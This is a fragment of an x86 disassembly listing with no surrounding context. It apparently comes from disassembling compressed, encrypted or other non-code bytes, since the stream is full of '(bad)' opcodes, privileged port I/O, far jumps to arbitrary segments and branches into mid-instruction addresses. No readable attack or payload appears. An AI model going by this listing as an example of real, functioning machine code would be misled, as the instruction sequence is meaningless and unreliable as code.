  41dfdc:	xchg   DWORD PTR ss:[ecx+0x12],ebx
  41dfe0:	push   eax
  41dfe1:	sbb    DWORD PTR [edx-0x1a6371ff],esp
  41dfe7:	push   ebp
  41dfe8:	shr    DWORD PTR [ebx+0x2f90b944],1
  41dfee:	ret    
  41dfef:	cmc    
  41dff0:	and    DWORD PTR [esi+0x4c],eax
  41dff3:	jns    0x41df92
  41dff5:	sti    
  41dff6:	dec    ebp
  41dff7:	fdivr  st(5),st
  41dff9:	mov    esi,0x54867624
  41dffe:	scas   al,BYTE PTR es:[edi]
  41dfff:	pop    ds
  41e000:	ins    BYTE PTR es:[edi],dx
  41e001:	outs   dx,DWORD PTR ds:[esi]
  41e002:	mov    al,0xa1
  41e004:	mov    dh,0xc4
  41e006:	or     BYTE PTR [ebx],cl
  41e008:	jno    0x41dfe6
  41e00a:	aas    
  41e00b:	adc    DWORD PTR [esi],0xa8078d6d
  41e011:	xor    ecx,DWORD PTR [esi-0x12782c05]
  41e017:	cli    
  41e018:	js     0x41dfe6
  41e01a:	or     BYTE PTR [edx],ch
  41e01c:	mov    ecx,?
  41e01e:	and    eax,0xe947c0f2
  41e023:	pop    esp
  41e024:	xor    cl,BYTE PTR [eax]
  41e026:	(bad)  
  41e027:	jmp    0x41e088
  41e029:	xchg   edx,eax
  41e02a:	mov    dl,0xe3
  41e02c:	ss hlt 
  41e02e:	mov    ecx,0xa387ab91
  41e033:	in     al,dx
  41e034:	adc    cl,al
  41e036:	lds    esi,FWORD PTR [ecx-0x3f66e81b]
  41e03c:	mov    dl,0xac
  41e03e:	mov    edi,0x8983ad5a
  41e043:	retf   0xc288
  41e046:	mov    al,ds:0x183a5264
  41e04b:	xor    eax,0xbef42388
  41e050:	in     eax,dx
  41e051:	jp     0x41e0a3
  41e053:	jg     0x41e052
  41e055:	pop    ebx
  41e056:	mov    bl,0xe9
  41e058:	(bad)  
  41e059:	sub    eax,0xdc6a9126
  41e05e:	cmp    DWORD PTR [esi+0x35f4acf4],0xb5a554d3
  41e068:	in     al,dx
  41e069:	sbb    bl,ah
  41e06b:	xchg   edx,eax
  41e06c:	pop    eax
  41e06d:	test   DWORD PTR [eax+0x72],0xe101a12a
  41e074:	dec    esi
  41e075:	fistp  WORD PTR [edi-0x56]
  41e078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e079:	add    eax,0x3b251f00
  41e07e:	sub    eax,0x6ade7f35
  41e083:	(bad)  
  41e084:	in     al,dx
  41e085:	jno    0x41e015
  41e087:	push   esp
  41e088:	enter  0x9e14,0xb5
  41e08c:	in     al,0xa0
  41e08e:	adc    ch,BYTE PTR [ebp-0x2ba2f7aa]
  41e094:	adc    eax,0x4311921f
  41e099:	es dec edx
  41e09b:	ds inc esp
  41e09d:	push   esi
  41e09e:	mov    eax,ds:0x69897f0b
  41e0a3:	and    ebp,DWORD PTR [esi-0x25]
  41e0a6:	in     al,dx
  41e0a7:	fcmovbe st,st(5)
  41e0a9:	inc    ebp
  41e0aa:	sub    DWORD PTR ds:0x496a0c70,ebx
  41e0b0:	mov    BYTE PTR [ebx],dh
  41e0b2:	fild   DWORD PTR [edx-0x9ab4008]
  41e0b8:	mov    ds:0x42cbe09f,al
  41e0bd:	retf   
  41e0be:	xchg   ebp,eax
  41e0bf:	popf   
  41e0c0:	push   es
  41e0c1:	icebp  
  41e0c2:	arpl   WORD PTR [ebx+0x272db1d8],di
  41e0c8:	ret    0xa556
  41e0cb:	or     ch,BYTE PTR [ebp+eiz*8-0x48]
  41e0cf:	pop    ds
  41e0d0:	cmp    bh,BYTE PTR [ebx]
  41e0d2:	jg     0x41e0d9
  41e0d4:	pop    ebx
  41e0d5:	xlat   BYTE PTR ds:[ebx]
  41e0d6:	push   0x19
  41e0d8:	enter  0xc6e7,0x8c
  41e0dc:	(bad)  
  41e0de:	call   0x21defcd2
  41e0e3:	dec    eax
  41e0e4:	inc    ebp
  41e0e5:	sub    ebx,eax
  41e0e7:	out    0xf3,al
  41e0e9:	jp     0x41e151
  41e0eb:	rcl    BYTE PTR [ecx+0x592b0c2f],cl
  41e0f1:	(bad)  
  41e0f2:	in     eax,dx
  41e0f3:	daa    
  41e0f4:	push   es
  41e0f5:	seto   BYTE PTR ds:0x5af35f89
  41e0fc:	call   0x4ae73534
  41e101:	cmp    edi,DWORD PTR [edx+0x2bc38100]
  41e107:	imul   DWORD PTR [edi+0x7f3f7a00]
  41e10d:	mov    al,0xf1
  41e10f:	bnd data16 js 0x41e12a
  41e113:	mov    al,0xda
  41e115:	jg     0x41e0f7
  41e117:	fld    TBYTE PTR [eax-0x1e3be80f]
  41e11d:	sub    eax,0x33520829
  41e122:	jl     0x41e0cd
  41e124:	push   0xc22b93da
  41e129:	ins    DWORD PTR es:[edi],dx
  41e12a:	sahf   
  41e12b:	repnz xchg esp,eax
  41e12d:	cwde   
  41e12e:	pop    esi
  41e12f:	adc    edi,edx
  41e131:	mov    ax,0x904
  41e135:	xor    bl,BYTE PTR [eax-0x20]
  41e138:	xlat   BYTE PTR ds:[ebx]
  41e139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e13a:	call   0x7169:0xa3be1026
  41e141:	inc    ecx
  41e142:	aaa    
  41e143:	je     0x41e14a
  41e145:	and    dh,BYTE PTR [esi]
  41e147:	mov    bh,0x63
  41e149:	scas   eax,DWORD PTR es:[edi]
  41e14a:	test   BYTE PTR [edi+0x41335326],cl
  41e150:	cmp    DWORD PTR ds:0x39d516f5,edi
  41e156:	sub    esi,esp
  41e158:	xor    DWORD PTR [edi+0x2a],edx
  41e15b:	not    BYTE PTR [esi]
  41e15d:	mov    ecx,0xce1b8488
  41e162:	mov    ds:0xe1bfdda2,eax
  41e167:	leave  
  41e168:	je     0x41e111
  41e16a:	push   ebx
  41e16b:	cli    
  41e16c:	cs xchg ebp,eax
  41e16e:	sub    eax,0xcd6a075d
  41e173:	out    0x7c,al
  41e175:	jmp    0x53d2f95
  41e17a:	shr    DWORD PTR [ebp-0x1],1
  41e17d:	cmp    al,0x6c
  41e17f:	loope  0x41e109
  41e181:	dec    DWORD PTR [edx+0x6e]
  41e184:	in     eax,dx
  41e185:	cmp    DWORD PTR [esi],edi
  41e187:	enter  0x6e58,0x73
  41e18b:	aad    0xa7
  41e18d:	repz sub bh,dl
  41e190:	cmp    eax,0x9579d88
  41e195:	or     eax,0x974386d3
  41e19a:	das    
  41e19b:	mov    dl,al
  41e19d:	pop    ebp
  41e19e:	or     ebx,esp
  41e1a0:	retf   
  41e1a1:	sahf   
  41e1a2:	mov    eax,ds:0x9ba55d60
  41e1a7:	ds mov bl,0xc9
  41e1aa:	aam    0xe9
  41e1ac:	ret    0x7f41
  41e1af:	scas   eax,DWORD PTR es:[edi]
  41e1b0:	sbb    ecx,0x1e
  41e1b3:	mov    es,WORD PTR [ebp-0x52]
  41e1b6:	pop    edx
  41e1b7:	lock inc ebp
  41e1b9:	ficomp WORD PTR [ecx+0x4]
  41e1bc:	pusha  
  41e1bd:	or     al,0x7a
  41e1bf:	add    ebp,ebp
  41e1c1:	jno    0x41e1e6
  41e1c3:	or     DWORD PTR [eax+0x3e31ea03],esi
  41e1c9:	jmp    FWORD PTR es:[edi+0x26f18846]
  41e1d0:	push   edx
  41e1d1:	pushf  
  41e1d2:	(bad)  
  41e1d3:	push   esp
  41e1d4:	jno    0x41e1b5
  41e1d6:	nop
  41e1d7:	stos   BYTE PTR es:[edi],al
  41e1d8:	scas   eax,DWORD PTR es:[edi]
  41e1d9:	cmp    BYTE PTR [esi],bh
  41e1db:	xchg   ebx,eax
  41e1dc:	dec    esi
  41e1dd:	aam    0x4d
  41e1df:	pop    ebp
  41e1e0:	xchg   DWORD PTR gs:[esi-0x40db9b6f],edi
  41e1e7:	inc    ebp
  41e1e8:	xor    eax,0xbe5b687c
  41e1ed:	mov    esp,0x96804635
  41e1f2:	inc    esi
  41e1f3:	jnp    0x41e1d6
  41e1f5:	sub    esp,DWORD PTR [eax]
  41e1f7:	mov    esi,0x225a3053
  41e1fc:	clc    
  41e1fd:	outs   dx,DWORD PTR ds:[esi]
  41e1fe:	fs add al,0x45
  41e201:	(bad)  
  41e203:	xor    cl,dl
  41e205:	mov    edi,0x43d74bf9
  41e20a:	push   ecx
  41e20b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e20c:	sbb    DWORD PTR [ebp+ebx*1+0x6b],0xac8f7c7c
  41e214:	aam    0xb1
  41e216:	push   edx
  41e217:	aaa    
  41e218:	shr    BYTE PTR [eax+eiz*1],cl
  41e21b:	mov    ds:0x591aecf2,eax
  41e220:	cmp    ecx,DWORD PTR [edx+0x4e]
  41e223:	xchg   esp,eax
  41e224:	dec    BYTE PTR [ebp-0x63212673]
  41e22a:	push   ss
  41e22b:	lock cld 
  41e22d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e22e:	dec    esp
  41e22f:	dec    esi
  41e230:	cmp    BYTE PTR ds:0xcc348272,ah
  41e236:	jno    0x41e222
  41e238:	or     al,0x22
  41e23a:	ins    BYTE PTR es:[edi],dx
  41e23b:	push   ebp
  41e23c:	out    0x2,eax
  41e23e:	cmp    BYTE PTR [edi+ebx*8+0x5b],ah
  41e242:	mov    ah,0xf7
  41e244:	arpl   bp,cx
  41e246:	retf   
  41e247:	out    0xcb,eax
  41e249:	mov    al,0x3b
  41e24b:	add    dl,BYTE PTR [edx]
  41e24d:	lods   al,BYTE PTR ds:[esi]
  41e24e:	jmp    0x95d4f938
  41e253:	sub    edi,ebx
  41e255:	or     dl,0xad
  41e258:	inc    ecx
  41e259:	and    DWORD PTR [ebp-0x1c],eax
  41e25c:	shr    BYTE PTR [ecx],1
  41e25e:	inc    ecx
  41e25f:	sbb    al,0xb
  41e261:	cmovb  edx,DWORD PTR [edx-0x1db35298]
  41e268:	adc    al,0x8c
  41e26a:	and    BYTE PTR [eax+0x2b],0xb1
  41e26e:	sbb    al,0xd0
  41e270:	dec    edi
  41e271:	inc    ecx
  41e272:	dec    ebx
  41e273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e274:	js     0x41e219
  41e276:	xchg   ecx,eax
  41e277:	jge    0x41e2f6
  41e279:	ficomp WORD PTR [ebx+ebp*2+0x964cdbf]
  41e280:	jecxz  0x41e233
  41e282:	in     al,0x9b
  41e284:	inc    eax
  41e285:	mov    ah,0x9c
  41e287:	cld    
  41e288:	fcomip st,st(1)
  41e28a:	xchg   ebx,eax
  41e28b:	and    dl,ch
  41e28d:	sub    esp,DWORD PTR [eax-0x36]
  41e290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e291:	mov    dh,0x7c
  41e293:	fs rol cl,cl
  41e296:	lods   al,BYTE PTR ds:[esi]
  41e297:	lea    ecx,[edi+0x5d]
  41e29a:	push   ds
  41e29b:	mov    eax,ds:0xe6ad0852
  41e2a0:	xor    edx,DWORD PTR [esp+esi*8+0x33]
  41e2a4:	pop    ds
  41e2a5:	popf   
  41e2a6:	inc    edi
  41e2a7:	mov    ecx,0x1571bd02
  41e2ac:	fsubr  QWORD PTR [ebx+0x103ab006]
  41e2b2:	and    eax,0xb9861ed
  41e2b7:	mov    dl,0x59
  41e2b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2ba:	in     al,dx
  41e2bb:	stos   DWORD PTR es:[edi],eax
  41e2bc:	mov    ds:0x87da000e,eax
  41e2c1:	sbb    edi,esi
  41e2c3:	cld    
  41e2c4:	sbb    eax,DWORD PTR [edi]
  41e2c6:	mov    ch,0x2b
  41e2c8:	add    esp,esp
  41e2ca:	pop    ebx
  41e2cb:	fimul  DWORD PTR [di-0x37]
  41e2cf:	mov    ebx,0xce1d3ff
  41e2d4:	xchg   esi,eax
  41e2d5:	ret    0x348f
  41e2d8:	xchg   esi,eax
  41e2d9:	sbb    BYTE PTR [ecx-0x3f],al
  41e2dc:	xlat   BYTE PTR ds:[ebx]
  41e2dd:	data16 loopne 0x41e278
  41e2e0:	pop    ebp
  41e2e1:	fidiv  DWORD PTR [ebx-0x2b4a4153]
  41e2e7:	mov    WORD PTR [eax-0x33],?
  41e2ea:	aad    0x3b
  41e2ec:	(bad)  
  41e2ed:	stos   DWORD PTR es:[edi],eax
  41e2ee:	push   0x96f431f9
  41e2f3:	push   ds
  41e2f4:	dec    DWORD PTR [ebx-0x7c]
  41e2f7:	add    eax,0x788039ab
  41e2fc:	lock scas al,BYTE PTR es:[edi]
  41e2fe:	(bad)  
  41e2ff:	jmp    0x321d:0xd6c7b5d8
  41e306:	push   ss
  41e307:	mov    ah,bh
  41e309:	in     eax,dx
  41e30a:	xchg   BYTE PTR [esi],ch
  41e30c:	mov    al,0xc9
  41e30e:	jbe    0x41e2ea
  41e310:	loopne 0x41e363
  41e312:	push   edx
  41e313:	pop    ebx
  41e314:	dec    edi
  41e315:	icebp  
  41e316:	push   ebx
  41e317:	stos   DWORD PTR es:[edi],eax
  41e318:	cmp    ecx,DWORD PTR [esi+0x5b]
  41e31b:	rcl    DWORD PTR [eax],1
  41e31d:	jmp    0x4bcc:0xe9376f10
  41e324:	dec    ebx
  41e325:	add    edi,edi
  41e327:	lock es jl 0x41e332
  41e32b:	sar    BYTE PTR [ebx-0x51],cl
  41e32e:	or     BYTE PTR [ebx-0xf3c6259],0xf9
  41e335:	inc    ebx
  41e336:	xchg   BYTE PTR [edx],ah
  41e338:	rcr    BYTE PTR [edi+ebx*4],1
  41e33b:	sahf   
  41e33c:	into   
  41e33d:	test   al,0x60
  41e33f:	int    0xb2
  41e341:	or     ecx,DWORD PTR [ebx]
  41e343:	mov    dh,0xc5
  41e345:	repnz leave 
  41e347:	test   eax,0x26f96300
  41e34c:	arpl   di,bp
  41e34e:	mov    BYTE PTR [edx-0x29],bl
  41e351:	mov    cl,0xff
  41e353:	into   
  41e354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e355:	fdivr  st,st(7)
  41e357:	out    0x32,al
  41e359:	pop    ebp
  41e35a:	pop    ebx
  41e35b:	aad    0xcf
  41e35d:	icebp  
  41e35e:	push   ecx
  41e35f:	mov    BYTE PTR [ecx],0xcb
  41e362:	sub    eax,0x1e4474ab
  41e367:	push   ecx
  41e368:	cld    
  41e369:	xchg   ebp,eax
  41e36a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e36b:	pop    eax
  41e36c:	mov    ds:0xde3977f2,eax
  41e371:	cmc    
  41e372:	int    0x64
  41e374:	in     eax,dx
  41e375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e376:	(bad)  
  41e377:	sub    al,0x5f
  41e379:	xchg   DWORD PTR [ebp+0x36],ebp
  41e37c:	sahf   
  41e37d:	adc    al,0x44
  41e37f:	dec    edx
  41e380:	mov    bh,0x7
  41e382:	jmp    0x8aa26ef4
  41e387:	sbb    al,0xcb
  41e389:	mov    ebp,0x3ba55c79
  41e38e:	test   BYTE PTR [ebx+edx*4],0x3
  41e392:	test   BYTE PTR [eax-0x3043f8ee],bh
  41e398:	inc    edi
  41e399:	test   cl,al
  41e39b:	inc    edi
  41e39c:	pushf  
  41e39d:	(bad)  
  41e39e:	jno    0x41e3cd
  41e3a0:	ss push es
  41e3a2:	icebp  
  41e3a3:	cwde   
  41e3a4:	ins    DWORD PTR es:[edi],dx
  41e3a5:	or     BYTE PTR [eax],cl
  41e3a7:	loop   0x41e3ec
  41e3a9:	dec    ebx
  41e3aa:	es xchg esp,eax
  41e3ac:	cmp    esi,esi
  41e3ae:	cmp    DWORD PTR [esi],edi
  41e3b0:	daa    
  41e3b1:	stc    
  41e3b2:	das    
  41e3b3:	xchg   ebp,eax
  41e3b4:	cmc    
  41e3b5:	pop    ebx
  41e3b6:	sbb    al,0xc5
  41e3b8:	sbb    al,0x4c
  41e3ba:	xchg   edi,eax
  41e3bb:	lahf   
  41e3bc:	cs mov ah,0x3a
  41e3bf:	pop    es
  41e3c0:	test   DWORD PTR [ecx-0x768a7109],ebp
  41e3c6:	sbb    al,0x88
  41e3c8:	push   ebx
  41e3c9:	pusha  
  41e3ca:	jo     0x41e3de
  41e3cc:	ret    0x57bb
  41e3cf:	imul   ecx,DWORD PTR [edi],0xffffffbf
  41e3d2:	repz add bh,al
  41e3d5:	mov    al,BYTE PTR [edi-0x3c]
  41e3d8:	sbb    al,0x3f
  41e3da:	repnz mov al,0xa9
  41e3dd:	xor    al,0x4b
  41e3df:	jle    0x41e448
  41e3e1:	fsubr  QWORD PTR [ecx+0x286ef2cc]
  41e3e7:	cdq    
  41e3e8:	ds add bl,bl
  41e3eb:	or     cl,BYTE PTR [eax]
  41e3ed:	and    esi,DWORD PTR [ebx+0x51ee7a9b]
  41e3f3:	ja     0x41e3a7
  41e3f5:	or     DWORD PTR [edx],esi
  41e3f7:	test   DWORD PTR [ecx+0x6d6d59bf],edx
  41e3fd:	pop    es
  41e3fe:	mov    ebp,0x3fc453df
  41e403:	(bad)  
  41e404:	xchg   edi,eax
  41e405:	in     eax,dx
  41e406:	jo     0x41e3a5
  41e408:	dec    edx
  41e409:	jp     0x41e43c
  41e40b:	mov    WORD PTR [ebx-0x14],es
  41e40e:	push   ecx
  41e40f:	popa   
  41e410:	icebp  
  41e411:	pushf  
  41e412:	mov    ecx,0x8991c776
  41e417:	push   esi
  41e418:	dec    sp
  41e41a:	pop    ebp
  41e41b:	pusha  
  41e41c:	push   ecx
  41e41d:	scas   eax,DWORD PTR es:[edi]
  41e41e:	pop    esi
  41e41f:	push   ebp
  41e420:	loopne 0x41e49c
  41e422:	(bad)  
  41e423:	mov    BYTE PTR [ecx+0x249a11fc],bl
  41e429:	or     BYTE PTR [esi],dh
  41e42b:	gs call 0x3b4c58a2
  41e431:	sbb    BYTE PTR [eax+0x6e358bbe],al
  41e437:	in     eax,0x41
  41e439:	aam    0xf7
  41e43b:	ret    
  41e43c:	(bad)  
  41e43d:	hlt    
  41e43e:	es lock xchg edi,eax
  41e441:	test   edx,ecx
  41e443:	xchg   BYTE PTR ds:0xf615f459,bh
  41e449:	sub    DWORD PTR [edx+0x656ebf33],esi
  41e44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e450:	stc    
  41e451:	push   edx
  41e452:	mov    WORD PTR [ecx+edi*8-0x3b],gs
  41e456:	ss sti 
  41e458:	aam    0x6b
  41e45a:	inc    ebx
  41e45b:	dec    ebp
  41e45c:	xchg   ebx,eax
  41e45d:	(bad)  
  41e45e:	sbb    esp,eax
  41e460:	pop    edi
  41e461:	popf   
  41e462:	xlat   BYTE PTR ds:[ebx]
  41e463:	pop    esi
  41e464:	je     0x41e47d
  41e466:	fld    TBYTE PTR [esi]
  41e468:	fs popf 
  41e46a:	cmp    DWORD PTR [esp+ebp*4-0x6476990],eax
  41e471:	jnp    0x41e4ed
  41e473:	maxps  xmm4,XMMWORD PTR [ebx]
  41e476:	mov    ch,0xd4
  41e478:	hlt    
  41e479:	push   ds
  41e47a:	or     al,0xdb
  41e47c:	popf   
  41e47d:	pusha  
  41e47e:	out    0x72,eax
  41e480:	jnp    0x41e4c6
  41e482:	push   cs
  41e483:	xchg   edx,eax
  41e484:	pop    es
  41e485:	pop    eax
  41e486:	imul   BYTE PTR [ebp+esi*2-0x7b]
  41e48a:	in     eax,dx
  41e48b:	in     al,dx
  41e48c:	add    DWORD PTR [ecx-0x17686655],edi
  41e492:	test   DWORD PTR [esi+0x1b],esp
  41e495:	adc    BYTE PTR [esi],0x85
  41e498:	js     0x41e4f7
  41e49a:	sub    dl,BYTE PTR [ebp-0x8]
  41e49d:	sahf   
  41e49e:	js     0x41e45b
  41e4a0:	lods   al,BYTE PTR ds:[esi]
  41e4a1:	jae    0x41e513
  41e4a3:	sbb    DWORD PTR [ecx],ecx
  41e4a5:	retf   
  41e4a6:	out    0x6e,eax
  41e4a8:	push   edx
  41e4a9:	mov    ds:0xee9f7424,al
  41e4ae:	sub    al,0xe6
  41e4b0:	cmp    DWORD PTR [edi-0xe],ecx
  41e4b3:	adc    eax,0x99fce102
  41e4b8:	xor    ebx,eax
  41e4ba:	out    dx,eax
  41e4bb:	loopne 0x41e4f5
  41e4bd:	(bad)  
  41e4be:	clc    
  41e4bf:	push   esp
  41e4c0:	pop    edi
  41e4c1:	dec    eax
  41e4c3:	repz in al,0xb4
  41e4c6:	pop    es
  41e4c7:	into   
  41e4c8:	push   ebp
  41e4c9:	ret    0xd330
  41e4cc:	xor    ch,BYTE PTR ds:0x946e363e
  41e4d2:	lods   al,BYTE PTR ds:[esi]
  41e4d3:	inc    edi
  41e4d4:	pop    esp
  41e4d5:	call   0x76bc40
  41e4da:	mov    al,ds:0x736f7253
  41e4df:	(bad)  
  41e4e0:	(bad)  [edx+0x3567a488]
  41e4e6:	inc    esp
  41e4e7:	mov    ds:0x67fc4742,eax
  41e4ec:	add    ecx,DWORD PTR [ebp-0x57be1255]
  41e4f2:	sbb    al,0x8
  41e4f4:	mov    eax,0x5b62d5b3
  41e4f9:	loopne 0x41e552
  41e4fb:	les    esp,FWORD PTR [esp+eax*2]
  41e4fe:	data16 xor BYTE PTR [ebx+0x2d],dh
  41e502:	call   0x9e60:0x7894b221
  41e509:	sahf   
  41e50a:	icebp  
  41e50b:	fsubr  QWORD PTR [ebp-0x1bb3afae]
  41e511:	mov    ah,0x42
  41e513:	dec    esp
  41e514:	pop    esi
  41e515:	pushf  
  41e516:	inc    esi
  41e517:	jno    0x41e50a
  41e519:	mov    cl,0x26
  41e51b:	mov    al,ds:0x974da34f
  41e520:	add    cl,BYTE PTR [edx]
  41e522:	sub    ebx,DWORD PTR [esp+eiz*8+0x35b956a0]
  41e529:	sti    
  41e52a:	dec    ebp
  41e52b:	(bad)  
  41e52c:	xor    DWORD PTR [esi],edi
  41e52e:	push   edi
  41e52f:	push   ss
  41e530:	jecxz  0x41e510
  41e532:	cmp    bl,BYTE PTR [edi-0x43]
  41e535:	lods   eax,DWORD PTR ds:[esi]
  41e536:	xchg   ebp,eax
  41e537:	mov    ebx,DWORD PTR [esp+ecx*1-0x38]
  41e53b:	mov    al,bh
  41e53d:	and    dh,bh
  41e53f:	sub    BYTE PTR [esi-0x20],0xd0
  41e543:	aas    
  41e544:	pop    eax
  41e545:	(bad)  
  41e546:	ficomp WORD PTR [edi-0x610c86db]
  41e54c:	xchg   esi,eax
  41e54d:	imul   edi,DWORD PTR [eax+0x2844dd61],0xffffffea
  41e554:	call   0x6675:0xa5ae9060
  41e55b:	sbb    eax,0x3eff07c
  41e560:	loopne 0x41e56b
  41e562:	mov    edi,0x15812ebe
  41e567:	test   eax,0x20ad8dd9
  41e56c:	push   0xffffffef
  41e56e:	or     bh,al
  41e570:	daa    
  41e571:	or     ecx,DWORD PTR ds:0xc1583fbd
  41e577:	xchg   edx,eax
  41e578:	lods   eax,DWORD PTR ds:[esi]
  41e579:	mov    al,cl
  41e57b:	imul   esp,DWORD PTR [ebp-0x4c],0x79c65691
  41e582:	jmp    0x41e53b
  41e584:	xor    BYTE PTR [ecx-0x16],bh
  41e587:	adc    BYTE PTR [ecx+0x4a8b0407],dh
  41e58d:	rcr    BYTE PTR [eax+eax*2-0x35],cl
  41e591:	retf   0x9641
  41e594:	mov    ecx,0xb8f4a090
  41e599:	mov    cl,0x6a
  41e59b:	mov    bl,0x36
  41e59d:	jp     0x41e524
  41e59f:	dec    edx
  41e5a0:	jg     0x41e584
  41e5a2:	mov    dh,0xbc
  41e5a4:	add    al,0x4
  41e5a6:	or     eax,0xc49b05eb
  41e5ab:	scas   eax,DWORD PTR es:[edi]
  41e5ac:	xor    dl,BYTE PTR [esi-0x4a]
  41e5af:	enterw 0xe478,0x15
  41e5b4:	push   0xffffff99
  41e5b6:	dec    di
  41e5b8:	cmp    DWORD PTR [edx+0x9],ebp
  41e5bb:	lock add BYTE PTR [eax],ah
  41e5be:	sub    eax,0x497cb810
  41e5c3:	mov    cl,0x2d
  41e5c5:	sub    cl,ch
  41e5c7:	ror    BYTE PTR ds:[ebx],1
  41e5ca:	retf   0xc147
  41e5cd:	or     BYTE PTR [edx+0x3f],dl
  41e5d0:	add    bl,bh
  41e5d2:	push   ebp
  41e5d3:	loop   0x41e642
  41e5d5:	div    ch
  41e5d7:	stc    
  41e5d8:	ins    DWORD PTR es:[edi],dx
  41e5d9:	and    ebx,DWORD PTR [ebx+0x7bec0ae]
  41e5df:	gs in  al,dx
  41e5e1:	and    al,0x28
  41e5e3:	mov    edi,0x721cd3e9
  41e5e8:	sub    al,0x4e
  41e5ea:	cmp    DWORD PTR [ebp+0x4d843a0e],ebx
  41e5f0:	push   cs
  41e5f1:	loope  0x41e65f
  41e5f3:	int3   
  41e5f4:	push   es
  41e5f5:	ins    BYTE PTR es:[edi],dx
  41e5f6:	ret    
  41e5f7:	push   ebx
  41e5f8:	cli    
  41e5f9:	cmp    BYTE PTR [esi+0x17],ah
  41e5fc:	sbb    ebx,DWORD PTR [edi]
  41e5fe:	pop    ecx
  41e5ff:	data16 add bl,bh
  41e602:	mov    dh,0xad
  41e604:	xor    BYTE PTR ds:0x25e21c2,ah
  41e60a:	inc    ebp
  41e60b:	mov    esi,0x425697fa
  41e610:	aam    0x26
  41e612:	push   ss
  41e613:	repnz push ds
  41e615:	shl    DWORD PTR ds:0x60e28960,cl
  41e61b:	(bad)  
  41e61c:	mov    al,ds:0x44b0a335
  41e621:	sub    al,0x62
  41e623:	lods   al,BYTE PTR ds:[esi]
  41e624:	ins    DWORD PTR es:[edi],dx
  41e625:	mov    dh,0xe5
  41e627:	ja     0x41e646
  41e629:	fs hlt 
  41e62b:	dec    ebp
  41e62c:	sbb    eax,0x5bd915bc
  41e631:	and    al,0xa9
  41e633:	jmp    0xa6c3:0xbe79b0b1
  41e63a:	sub    ch,al
  41e63c:	or     edi,esp
  41e63e:	mov    ebx,0x69f76175
  41e643:	mov    ah,0xe9
  41e645:	fld1   
  41e647:	in     al,0xc4
  41e649:	and    eax,0xa6f5eeb9
  41e64e:	sub    DWORD PTR [ebp-0x23],0x13
  41e652:	fidivr WORD PTR [ebx]
  41e654:	adc    dl,cl
  41e656:	adc    dh,BYTE PTR [eax+0x7dfeac40]
  41e65c:	sbb    eax,esp
  41e65e:	cmp    DWORD PTR [eax],edi
  41e660:	enter  0x5377,0x3a
  41e664:	and    ecx,edi
  41e666:	mov    bl,0x20
  41e668:	sbb    dh,0x34
  41e66b:	sahf   
  41e66c:	add    cl,0xe2
  41e66f:	mov    ebp,0xbe7954a3
  41e674:	inc    eax
  41e675:	xchg   ecx,eax
  41e676:	aas    
  41e677:	outs   dx,DWORD PTR ds:[esi]
  41e678:	fiadd  WORD PTR [ecx+0x3fc854eb]
  41e67e:	repnz ins DWORD PTR es:[edi],dx
  41e680:	aam    0x8e
  41e682:	xlat   BYTE PTR ds:[ebx]
  41e683:	pop    edx
  41e684:	push   ss
  41e685:	enter  0xda93,0xc0
  41e689:	add    esi,ebp
  41e68b:	xor    dl,ch
  41e68d:	rcl    ch,0x8d
  41e690:	icebp  
  41e691:	mov    ebx,0xe8e1993d
  41e696:	fmul   DWORD PTR [edx]
  41e698:	mov    ah,0xdb
  41e69a:	ret    
  41e69b:	mov    al,ds:0xb4f1ed48
  41e6a0:	jg     0x41e65f
  41e6a2:	ret    
  41e6a3:	cdq    
  41e6a4:	dec    edi
  41e6a5:	cli    
  41e6a6:	inc    edx
  41e6a7:	push   edi
  41e6a8:	(bad)  
  41e6a9:	xchg   ecx,eax
  41e6aa:	pop    eax
  41e6ab:	lods   eax,DWORD PTR ds:[esi]
  41e6ac:	fwait
  41e6ad:	mov    eax,0x2c649947
  41e6b2:	pop    esi
  41e6b3:	mov    edi,0x48eb8477
  41e6b8:	aad    0x1f
  41e6ba:	mov    ecx,0x4fbe85b6
  41e6bf:	jbe    0x41e6f4
  41e6c1:	jg     0x41e69a
  41e6c3:	aas    
  41e6c4:	mov    ah,0xec
  41e6c6:	out    0x82,al
  41e6c8:	and    esi,DWORD PTR ss:0xfaffd4b9
  41e6cf:	jmp    0x41e746
  41e6d1:	adc    ecx,DWORD PTR [ebx-0x6add99c8]
  41e6d7:	pop    esp
  41e6d8:	mov    edi,0xe374a54e
  41e6dd:	mov    bh,0xe3
  41e6df:	(bad)  
  41e6e0:	mov    esp,0x8fc0601e
  41e6e5:	fnstenv [eiz*1+0x6acdd823]
  41e6ec:	mov    eax,ds:0x7700a382
  41e6f1:	mov    cl,0x3e
  41e6f3:	adc    ecx,DWORD PTR [edx]
  41e6f5:	pop    ebp
  41e6f6:	pop    ebp
  41e6f7:	sub    BYTE PTR [eax+0x76ab0ef5],dh
  41e6fd:	dec    eax
  41e6fe:	push   es
  41e6ff:	nop
  41e700:	inc    BYTE PTR [ebx-0x1ea2a432]
  41e706:	iret   
  41e707:	and    DWORD PTR [eax+esi*8-0x6e],edx
  41e70b:	pop    ss
  41e70c:	mov    ch,0x32
  41e70e:	ficom  DWORD PTR [edx-0x7c]
  41e711:	fild   WORD PTR [edx-0x78]
  41e714:	xchg   esi,eax
  41e715:	adc    al,0x4
  41e717:	push   eax
  41e718:	outs   dx,DWORD PTR ds:[esi]
  41e719:	inc    eax
  41e71a:	imul   ecx,DWORD PTR [ecx+0x7c],0xb671d772
  41e721:	mov    ebp,DWORD PTR [ebp+0x44b56e9e]
  41e727:	xchg   ebx,eax
  41e728:	fst    st(1)
  41e72a:	push   cs
  41e72b:	xchg   ecx,eax
  41e72c:	mov    bl,0x4
  41e72e:	cwde   
  41e72f:	adc    dl,BYTE PTR [esi+0x380e4235]
  41e735:	je     0x41e75c
  41e737:	aaa    
  41e738:	fisttp WORD PTR [edi+0x29]
  41e73b:	mov    dh,0x2b
